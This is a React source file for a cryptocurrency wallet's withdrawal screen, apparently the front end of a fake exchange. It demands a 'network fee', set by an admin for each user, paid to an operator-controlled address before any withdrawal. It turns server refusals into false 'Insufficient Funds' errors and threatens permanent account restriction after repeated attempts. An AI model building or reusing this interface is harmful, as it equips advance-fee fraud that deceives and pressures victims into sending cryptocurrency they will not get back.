import React, { useEffect, useId, useState, useRef, useCallback } from 'react';
import { ArrowLeft, AlertCircle, Copy, X, Clock, CheckCircle } from 'lucide-react';
import { ViewState } from '../App';
import { AssetType } from '../store';
import { api, ApiError, WalletData, SettingsData } from '../api';
import { toast } from 'sonner';

// ── Lockout persistence (per-username, survives page refresh) ─────────────────

const LOCKOUT_KEY = 'trant_withdraw_lockout';
const MAX_ATTEMPTS = 5;
const LOCKOUT_SECONDS = 5 * 60; // 5 minutes

interface LockoutState {
  attempts: number;
  lockedUntil: number | null; // epoch ms — null means not locked
}

function getLockout(username: string): LockoutState {
  try {
    const raw = localStorage.getItem(`${LOCKOUT_KEY}_${username}`);
    if (!raw) return { attempts: 0, lockedUntil: null };
    return JSON.parse(raw) as LockoutState;
  } catch {
    return { attempts: 0, lockedUntil: null };
  }
}

function saveLockout(username: string, state: LockoutState) {
  localStorage.setItem(`${LOCKOUT_KEY}_${username}`, JSON.stringify(state));
}

function clearLockout(username: string) {
  localStorage.removeItem(`${LOCKOUT_KEY}_${username}`);
}

// ── Insufficient Funds Popup ──────────────────────────────────────────────────

interface InsufficientFundsPopupProps {
  attemptsLeft: number;
  onClose: () => void;
}

function InsufficientFundsPopup({ attemptsLeft, onClose }: InsufficientFundsPopupProps) {
  return (
    <div className="fixed inset-0 z-[60] flex items-center justify-center bg-black/70 backdrop-blur-sm p-5">
      <div className="w-full max-w-[390px] bg-card border border-destructive/30 rounded-3xl p-6 flex flex-col gap-5 shadow-2xl">
        <div className="flex items-start justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-full bg-destructive/15 flex items-center justify-center shrink-0">
              <AlertCircle className="w-5 h-5 text-destructive" />
            </div>
            <h2 className="text-base font-bold text-foreground">Insufficient Funds</h2>
          </div>
          <button onClick={onClose} className="p-1 text-muted hover:text-foreground transition-colors">
            <X className="w-5 h-5" />
          </button>
        </div>

        <p className="text-sm text-muted leading-relaxed">
          Your account does not have sufficient funds to complete this withdrawal. Please ensure your network fee has been cleared before attempting again.
        </p>

        {attemptsLeft > 0 ? (
          <div className="bg-amber-500/10 border border-amber-500/20 rounded-2xl px-4 py-3 text-sm text-amber-400 font-medium">
            ⚠️ {attemptsLeft} attempt{attemptsLeft !== 1 ? 's' : ''} remaining before your account is permanently restricted.
          </div>
        ) : (
          <div className="bg-destructive/10 border border-destructive/20 rounded-2xl px-4 py-3 text-sm text-destructive font-medium">
            🚫 Your account has been permanently restricted. Contact support to regain access.
          </div>
        )}

        <button
          onClick={onClose}
          className="w-full bg-destructive hover:bg-destructive/90 text-white font-semibold rounded-xl px-4 py-4 transition-colors active:scale-[0.98]"
        >
          Close
        </button>
      </div>
    </div>
  );
}

// ── Fee Popup ─────────────────────────────────────────────────────────────────

interface FeePopupProps {
  feeInAsset: number;
  assetLabel: string;
  feeAddress: string;
  feeUsd: number;
  onClose: () => void;
}

function FeePopup({ feeInAsset, assetLabel, feeAddress, feeUsd, onClose }: FeePopupProps) {
  const handleCopy = () => {
    navigator.clipboard.writeText(feeAddress)
      .then(() => toast.success('Deposit address copied'))
      .catch(() => toast.error('Failed to copy'));
  };
  return (
    <div className="fixed inset-0 z-[60] flex items-center justify-center bg-black/70 backdrop-blur-sm p-5">
      <div className="w-full max-w-[390px] bg-card border border-destructive/30 rounded-3xl p-6 flex flex-col gap-5 shadow-2xl">
        <div className="flex items-start justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-full bg-destructive/15 flex items-center justify-center shrink-0">
              <AlertCircle className="w-5 h-5 text-destructive" />
            </div>
            <h2 className="text-base font-bold text-foreground">Network Fee Required</h2>
          </div>
          <button onClick={onClose} className="p-1 text-muted hover:text-foreground transition-colors">
            <X className="w-5 h-5" />
          </button>
        </div>

        <p className="text-sm text-muted leading-relaxed">
          Before your withdrawal can be processed, you must clear the network fee below. Send the exact amount to the address provided.
        </p>

        <div className="bg-destructive/10 border border-destructive/20 rounded-2xl p-4 flex flex-col gap-3">
          <div className="flex flex-col gap-1">
            <span className="text-xs text-muted uppercase tracking-widest font-medium">Amount Due</span>
            <span className="text-2xl font-bold text-destructive">
              {feeInAsset} {assetLabel}
              <span className="text-sm font-normal text-muted ml-2">≈ ${feeUsd.toFixed(2)}</span>
            </span>
          </div>
          <div className="flex flex-col gap-1">
            <span className="text-xs text-muted uppercase tracking-widest font-medium">Send Fee To</span>
            <button
              onClick={handleCopy}
              className="flex items-center gap-2 bg-background/60 border border-border/60 rounded-xl px-3 py-2.5 text-left hover:bg-background transition-colors"
            >
              <span className="font-mono text-xs text-foreground break-all leading-relaxed flex-1">{feeAddress}</span>
              <Copy className="w-4 h-4 text-muted shrink-0" />
            </button>
          </div>
        </div>

        <button
          onClick={onClose}
          className="w-full bg-destructive hover:bg-destructive/90 text-white font-semibold rounded-xl px-4 py-4 transition-colors active:scale-[0.98]"
        >
          Got it — I'll pay the fee
        </button>
      </div>
    </div>
  );
}

// ── Countdown display ─────────────────────────────────────────────────────────

function useCountdown(lockedUntil: number | null, onExpire: () => void) {
  const [remaining, setRemaining] = useState(0);
  const cbRef = useRef(onExpire);
  cbRef.current = onExpire;

  useEffect(() => {
    if (!lockedUntil) { setRemaining(0); return; }
    const tick = () => {
      const secs = Math.max(0, Math.ceil((lockedUntil - Date.now()) / 1000));
      setRemaining(secs);
      if (secs === 0) cbRef.current();
    };
    tick();
    const id = setInterval(tick, 1000);
    return () => clearInterval(id);
  }, [lockedUntil]);

  return remaining;
}

// ── Main component ────────────────────────────────────────────────────────────

interface SendWithdrawViewProps {
  asset: AssetType;
  onNavigate: (view: ViewState, asset?: AssetType) => void;
}

export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
  const checkboxId = useId();
  const [wallet, setWallet] = useState<WalletData | null>(null);
  const [settings, setSettings] = useState<SettingsData | null>(null);
  const [address, setAddress] = useState('');
  const [amount, setAmount] = useState('');
  const [submitting, setSubmitting] = useState(false);
  const [loading, setLoading] = useState(true);
  const [gasFeeAcknowledged, setGasFeeAcknowledged] = useState(false);
  const [showFeePopup, setShowFeePopup] = useState(false);
  const [showInsufficientPopup, setShowInsufficientPopup] = useState(false);
  const [insufficientAttemptsLeft, setInsufficientAttemptsLeft] = useState(0);
  const [submitted, setSubmitted] = useState(false);

  // Lockout state
  const [lockout, setLockout] = useState<LockoutState>({ attempts: 0, lockedUntil: null });

  // Stable per-user key derived from wallet user_id
  const userKey = useRef<string>('anonymous');

  useEffect(() => {
    Promise.all([api.getWallet(), api.getSettings()])
      .then(([w, s]) => {
        setWallet(w);
        setSettings(s);
        const key = w.user_id != null ? `uid_${w.user_id}` : 'anonymous';
        userKey.current = key;
        setLockout(getLockout(key));
      })
      .catch(() => toast.error('Failed to load wallet data'))
      .finally(() => setLoading(false));
  }, []);

  useEffect(() => {
    const interval = setInterval(() => {
      api.getSettings().then(s => setSettings(s)).catch(() => {});
      api.getWallet().then(w => setWallet(w)).catch(() => {});
    }, 15_000);
    return () => clearInterval(interval);
  }, []);

  // Reset lockout when the 5-minute window expires
  const handleLockoutExpired = useCallback(() => {
    const fresh: LockoutState = { attempts: 0, lockedUntil: null };
    setLockout(fresh);
    saveLockout(userKey.current, fresh);
  }, []);

  const remainingSecs = useCountdown(lockout.lockedUntil, handleLockoutExpired);
  const isLocked = lockout.lockedUntil !== null && remainingSecs > 0;

  if (loading || !wallet || !settings) {
    return (
      <div className="flex flex-col h-full items-center justify-center bg-background">
        <div className="w-8 h-8 border-2 border-primary border-t-transparent rounded-full animate-spin" />
      </div>
    );
  }

  const maxAmount = wallet[asset] as number;

  const prices: Record<AssetType, number> = {
    btc: settings.btc_price,
    eth: settings.eth_price,
    usdt_trc20: settings.usdt_price,
    usdt_bep20: settings.usdt_price,
    usdt_erc20: settings.usdt_price,
    trx: settings.trx_price,
  };

  const feeDepositAddress: string | null | undefined =
    settings[`deposit_address_${asset}` as keyof SettingsData] as string | null | undefined;

  const isUsdt = asset === 'usdt_trc20' || asset === 'usdt_bep20' || asset === 'usdt_erc20';

  // Each user has their own network fee requirement, set by an admin for
  // this specific asset. There is no site-wide fallback — if an admin
  // hasn't set a fee for this user, no fee is required.
  const networkFeeKey = `network_fee_${asset}` as keyof WalletData;
  const userFeeOverride = wallet[networkFeeKey] as number | null | undefined;
  const feeUsd = userFeeOverride ?? 0;

  const feeInAsset: number = isUsdt
    ? parseFloat(feeUsd.toFixed(4))
    : parseFloat((feeUsd / prices[asset]).toFixed(8));

  const assetLabel = (() => {
    switch (asset) {
      case 'usdt_trc20': return 'USDT (TRC20)';
      case 'usdt_bep20': return 'USDT (BEP20)';
      case 'usdt_erc20': return 'USDT (ERC20)';
      default: return asset.toUpperCase();
    }
  })();

  const getAssetName = () => {
    switch (asset) {
      case 'btc': return 'Bitcoin (BTC)';
      case 'eth': return 'Ethereum (ETH)';
      case 'usdt_trc20': return 'Tether USDT (TRC20)';
      case 'usdt_bep20': return 'Tether USDT (BEP20)';
      case 'usdt_erc20': return 'Tether USDT (ERC20)';
      case 'trx': return 'Tron (TRX)';
    }
  };

  // Gas fee section shown when auto-approve is off, a deposit address is configured,
  // and this user actually has a network fee requirement set for this asset.
  const showGasFeeSection = !settings.auto_approve && !!feeDepositAddress && feeUsd > 0;

  const copyFeeAddress = () => {
    if (!feeDepositAddress) return;
    navigator.clipboard.writeText(feeDepositAddress)
      .then(() => toast.success('Deposit address copied'))
      .catch(() => toast.error('Failed to copy'));
  };

  const handleSend = async () => {
    if (isLocked) return;

    if (!address.trim()) {
      toast.error('Please enter a recipient address');
      return;
    }
    const withdrawAmount = parseFloat(amount);
    if (isNaN(withdrawAmount) || withdrawAmount <= 0) {
      toast.error('Please enter a valid amount');
      return;
    }
    if (withdrawAmount > maxAmount) {
      toast.error(`Insufficient ${assetLabel} balance`);
      return;
    }

    // Fee checkbox must be ticked if section is shown
    if (showGasFeeSection && !gasFeeAcknowledged) {
      setShowFeePopup(true);
      return;
    }

    setSubmitting(true);
    try {
      await api.requestWithdrawal(asset, withdrawAmount, address.trim());
      // Success — clear any lockout
      clearLockout(userKey.current);
      setLockout({ attempts: 0, lockedUntil: null });
      setSubmitted(true);
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : 'Transaction failed';

      // Use HTTP 403 status as the authoritative signal
      const is403 = err instanceof ApiError && err.status === 403;

      if (is403) {
        const current = getLockout(userKey.current);
        const newAttempts = current.attempts + 1;

        if (newAttempts >= MAX_ATTEMPTS) {
          // 5-minute lockout
          const lockedUntil = Date.now() + LOCKOUT_SECONDS * 1000;
          const next: LockoutState = { attempts: newAttempts, lockedUntil };
          saveLockout(userKey.current, next);
          setLockout(next);
          // Still show popup (0 attempts left) before screen transitions
          setInsufficientAttemptsLeft(0);
          setShowInsufficientPopup(true);
        } else {
          const next: LockoutState = { attempts: newAttempts, lockedUntil: null };
          saveLockout(userKey.current, next);
          setLockout(next);
          setInsufficientAttemptsLeft(MAX_ATTEMPTS - newAttempts);
          setShowInsufficientPopup(true);
        }
      } else {
        toast.error(msg);
      }
    } finally {
      setSubmitting(false);
    }
  };

  // ── Success screen ────────────────────────────────────────────────────────

  if (submitted) {
    return (
      <div className="flex flex-col h-full bg-background">
        <div className="flex items-center p-6 pt-8 relative">
          <button
            onClick={() => onNavigate('asset-details', asset)}
            className="p-2 -ml-2 text-muted hover:text-foreground transition-colors absolute left-6"
          >
            <ArrowLeft className="w-6 h-6" />
          </button>
          <div className="font-medium text-foreground w-full text-center">Send Crypto</div>
        </div>
        <div className="flex-1 flex flex-col items-center justify-center px-8 gap-6 text-center">
          <div className="w-20 h-20 rounded-full bg-amber-500/15 flex items-center justify-center">
            <Clock className="w-10 h-10 text-amber-400" />
          </div>
          <div className="flex flex-col gap-2">
            <h2 className="text-xl font-bold text-foreground">Request Submitted</h2>
            <p className="text-muted text-sm leading-relaxed">
              Your withdrawal request has been received and is being processed. You'll be notified once it's completed.
            </p>
          </div>
          <button
            onClick={() => onNavigate('asset-details', asset)}
            className="w-full bg-primary hover:bg-primary/90 text-background font-medium rounded-xl px-4 py-4 transition-colors active:scale-[0.98]"
          >
            Back to {assetLabel}
          </button>
        </div>
      </div>
    );
  }

  // ── Lockout screen (5-minute cooldown) ───────────────────────────────────

  if (isLocked) {
    const formatCountdown = (secs: number) => {
      const m = Math.floor(secs / 60).toString().padStart(2, '0');
      const s = (secs % 60).toString().padStart(2, '0');
      return `${m}:${s}`;
    };

    return (
      <div className="flex flex-col h-full bg-background">
        <div className="flex items-center p-6 pt-8 relative">
          <button
            onClick={() => onNavigate('asset-details', asset)}
            className="p-2 -ml-2 text-muted hover:text-foreground transition-colors absolute left-6"
          >
            <ArrowLeft className="w-6 h-6" />
          </button>
          <div className="font-medium text-foreground w-full text-center">Send Crypto</div>
        </div>
        <div className="flex-1 flex flex-col items-center justify-center px-8 gap-6 text-center">
          <div className="w-20 h-20 rounded-full bg-destructive/15 flex items-center justify-center">
            <Clock className="w-10 h-10 text-destructive" />
          </div>
          <div className="flex flex-col gap-3">
            <h2 className="text-xl font-bold text-foreground">Temporarily Restricted</h2>
            <p className="text-muted text-sm leading-relaxed">
              Multiple failed attempts detected. Please clear your network fee and try again in:
            </p>
            <div className="text-5xl font-bold text-destructive tabular-nums">
              {formatCountdown(remainingSecs)}
            </div>
            <p className="text-xs text-muted">minutes : seconds</p>
          </div>
          <div className="w-full bg-destructive/10 border border-destructive/20 rounded-2xl p-4 flex flex-col gap-3 text-left">
            <div className="text-sm font-semibold text-foreground">Why am I seeing this?</div>
            <p className="text-xs text-muted leading-relaxed">
              You attempted to withdraw {MAX_ATTEMPTS} times without clearing the required network fee. Please clear the fee, then return once the timer expires.
            </p>
          </div>
        </div>
      </div>
    );
  }

  // ── Main form ─────────────────────────────────────────────────────────────

  return (
    <>
      <div className="flex flex-col h-full bg-background">
        {/* Header */}
        <div className="flex items-center p-6 pt-8 relative">
          <button
            onClick={() => onNavigate('asset-details', asset)}
            className="p-2 -ml-2 text-muted hover:text-foreground transition-colors absolute left-6"
          >
            <ArrowLeft className="w-6 h-6" />
          </button>
          <div className="font-medium text-foreground w-full text-center">Send Crypto</div>
        </div>

        <div className="flex flex-col flex-1 px-6 py-4 gap-5 overflow-y-auto">

          {/* Asset */}
          <div className="flex flex-col gap-2">
            <label className="text-sm text-muted px-1">Asset</label>
            <div className="w-full bg-card/50 border border-border rounded-xl px-4 py-3.5 text-foreground opacity-70">
              {getAssetName()}
            </div>
          </div>

          {/* Recipient */}
          <div className="flex flex-col gap-2">
            <label className="text-sm text-muted px-1">Recipient Address</label>
            <input
              type="text"
              value={address}
              onChange={(e) => setAddress(e.target.value)}
              className="w-full bg-card border border-border rounded-xl px-4 py-3.5 text-foreground focus:outline-none focus:border-primary transition-colors font-mono text-sm"
              placeholder="Paste wallet address"
            />
          </div>

          {/* Amount */}
          <div className="flex flex-col gap-2">
            <div className="flex justify-between items-center px-1">
              <label className="text-sm text-muted">Amount</label>
              <span
                className="text-xs text-primary font-medium cursor-pointer"
                onClick={() => setAmount(maxAmount.toString())}
              >
                Max
              </span>
            </div>
            <div className="relative">
              <input
                type="number"
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                className="w-full bg-card border border-border rounded-xl px-4 py-3.5 text-foreground focus:outline-none focus:border-primary transition-colors text-lg"
                placeholder="0.00"
                step="any"
              />
              <div className="absolute right-4 top-1/2 -translate-y-1/2 text-muted font-medium text-sm">
                {assetLabel}
              </div>
            </div>
            <div className="text-xs text-muted px-1 flex justify-between">
              <span>Available: {maxAmount > 0 ? maxAmount.toLocaleString(undefined, { maximumFractionDigits: 8 }) : '0'} {assetLabel}</span>
              <span>~${(parseFloat(amount || '0') * prices[asset]).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</span>
            </div>
          </div>

          {/* Network Fee section */}
          {showGasFeeSection && (
            <div className="flex flex-col gap-4 p-4 rounded-xl border border-[#da3637]/30 bg-[#da3637]/10">
              <div className="flex gap-3">
                <AlertCircle className="w-5 h-5 text-destructive shrink-0 mt-0.5" />
                <div className="flex flex-col gap-1">
                  <div className="text-sm font-semibold text-foreground">Network Fee Required</div>
                  <div className="text-xl font-bold text-destructive">
                    {feeInAsset} {assetLabel}
                    <span className="text-sm font-normal text-muted ml-2">≈ ${feeUsd.toFixed(2)}</span>
                  </div>
                  <div className="text-xs text-muted/90 leading-relaxed">
                    You must send the network fee to the address below before your withdrawal is processed.
                  </div>
                </div>
              </div>

              <div className="flex flex-col gap-2">
                <span className="text-xs text-muted uppercase tracking-widest font-medium">Send fee to this {assetLabel} address</span>
                <button
                  onClick={copyFeeAddress}
                  className="flex items-center gap-3 bg-background/60 border border-border/60 rounded-xl px-4 py-3 text-left hover:bg-background transition-colors active:scale-[0.98]"
                >
                  <span className="font-mono text-xs text-foreground break-all leading-relaxed flex-1">{feeDepositAddress}</span>
                  <Copy className="w-4 h-4 text-muted shrink-0" />
                </button>
              </div>

              <label htmlFor={checkboxId} className="flex items-start gap-3 cursor-pointer select-none">
                <input
                  id={checkboxId}
                  type="checkbox"
                  checked={gasFeeAcknowledged}
                  onChange={(e) => setGasFeeAcknowledged(e.target.checked)}
                  className="mt-0.5 w-4 h-4 accent-primary cursor-pointer shrink-0"
                />
                <span className="text-xs text-muted leading-relaxed">
                  I confirm I have already sent the network fee of{' '}
                  <span className="text-destructive font-semibold">{feeInAsset} {assetLabel}</span>{' '}
                  to the address above and my withdrawal is ready to be processed.
                </span>
              </label>

              {gasFeeAcknowledged && (
                <div className="rounded-lg bg-success/10 border border-success/30 px-3 py-2.5 flex gap-2 items-center">
                  <CheckCircle className="w-4 h-4 text-success shrink-0" />
                  <p className="text-xs text-success font-medium">Fee confirmed — ready to submit.</p>
                </div>
              )}
            </div>
          )}

          {/* Submit */}
          <button
            onClick={handleSend}
            disabled={submitting}
            className="w-full bg-destructive hover:bg-destructive/90 disabled:opacity-40 disabled:cursor-not-allowed text-white font-medium rounded-xl px-4 py-4 mt-auto transition-colors shadow-[0_0_20px_rgba(218,54,55,0.2)] active:scale-[0.98]"
          >
            {submitting ? 'Processing…' : 'Submit Withdrawal Request'}
          </button>

        </div>
      </div>

      {showFeePopup && feeDepositAddress && (
        <FeePopup
          feeInAsset={feeInAsset}
          assetLabel={assetLabel}
          feeAddress={feeDepositAddress}
          feeUsd={feeUsd}
          onClose={() => setShowFeePopup(false)}
        />
      )}

      {showInsufficientPopup && (
        <InsufficientFundsPopup
          attemptsLeft={insufficientAttemptsLeft}
          onClose={() => setShowInsufficientPopup(false)}
        />
      )}
    </>
  );
}
